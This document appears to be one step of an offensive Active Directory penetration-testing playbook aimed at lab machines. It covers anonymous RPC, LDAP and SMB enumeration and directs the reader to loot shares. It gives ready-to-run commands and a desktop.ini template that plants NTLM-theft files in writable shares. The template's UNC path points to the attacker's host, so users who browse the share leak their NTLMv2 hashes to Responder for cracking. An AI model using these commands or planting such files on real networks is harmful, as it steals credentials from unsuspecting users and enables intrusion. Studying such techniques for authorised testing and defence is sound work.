# AD - Anonymous Enum

**Step 36 of 50 · AD**

*Test whether RPC, LDAP, or SMB exposes users or shares without credentials.*

## Run this

```bash
rpcclient -U '' -N $BoxIP -c 'enumdomusers'
ldapsearch -x -H ldap://$BoxIP \
  -b "$(echo $Domain | awk -F. '{for(i=1;i<=NF;i++) printf "DC="$i(i<NF?",":""); print ""}')" \
  '(&(objectCategory=person)(objectClass=user))' sAMAccountName | grep sAMAccountName
smbclient -N -L //$BoxIP
```

## Example output

```

enumdomusers: NT_STATUS_ACCESS_DENIED
# LDAP bind accepted, no user objects
Anonymous login successful for IPC$
```
## What did you get?

- [ ] RPC or LDAP returned users → **Save usernames and go to Step 38 · [[AD - AS-REP Roasting]]**
- [ ] SMB exposed a useful share → **Browse and loot it, then return to the AD path**
- [ ] All three returned nothing useful → **Go to Step 37 · [[AD - Web Enum]]**
- [ ] Anonymous access was denied everywhere → **Go to Step 37 · [[AD - Web Enum]]**
- [ ] A writable SMB share is found → **Drop a malicious `desktop.ini` with a UNC icon path while Responder listens. Any user who browses the share can trigger NTLMv2 capture. Go to Step 38 · [[AD - Password Spray]] once the hash is cracked.**

## Notes

RPC and LDAP can return different account lists. Keep both outputs.

If a writable share is found and users are likely to browse it, place an NTLM theft file in the share:

```bash
python3 $ToolDir/ntlm_theft.py -g all -s $LocalIP -f invoice
smbclient //$BoxIP/Shared -U "$Domain/$Username%$Password" -c "lcd $BoxDir/loot/ntlmtheft/invoice; put desktop.ini; put invoice.library-ms"
```

The file must be in the share root with the exact generated filename. Keep Responder running and wait for an inbound authentication.

## Gotcha

> [!warning] 💡
> Empty anonymous AD enumeration is not a dead end. The website may list the employee names needed to build a roasting list.

> [!warning] 💡
> desktop.ini format for NTLM theft:
> ```ini
> [.ShellClassInfo]
> IconResource=\\$LocalIP\share\icon.ico
> ```
> The file must be named exactly desktop.ini and placed in the root of the share.
